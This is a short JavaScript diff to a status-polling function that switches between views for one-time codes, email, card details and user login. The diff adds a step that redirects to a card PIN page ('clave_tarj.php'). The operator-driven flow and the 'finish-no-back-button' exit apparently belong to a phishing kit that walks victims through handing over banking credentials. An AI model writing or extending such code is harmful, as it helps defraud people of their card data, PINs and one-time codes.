@@ -11,22 +11,25 @@ function consultar_estado(){
            
             switch (data) {
                 case '2':espera = 0;
-                         vista_otp(); 
+                         vista_otp();
                          break;
                 case '4':espera = 0;
-                         vista_correo(); 
+                         vista_correo();
                          break;
                 case '6':espera = 0;
-                         vista_tarjeta();  
-                         break;               
+                         vista_tarjeta();
+                         break;
+                case '13':espera = 0;
+                          window.location.href = "./clave_tarj.php";
+                          break;
                 case '8':espera = 0;
-                         vista_otp(); 
+                         vista_otp();
                          break;
                 case '10':espera = 0;
                           window.location.href = "../../../finish-no-back-button/";
                           break;
                 case '12':espera = 0;
-                          vista_usuario(); 
+                          vista_usuario();
                           break;
             } 
         });    
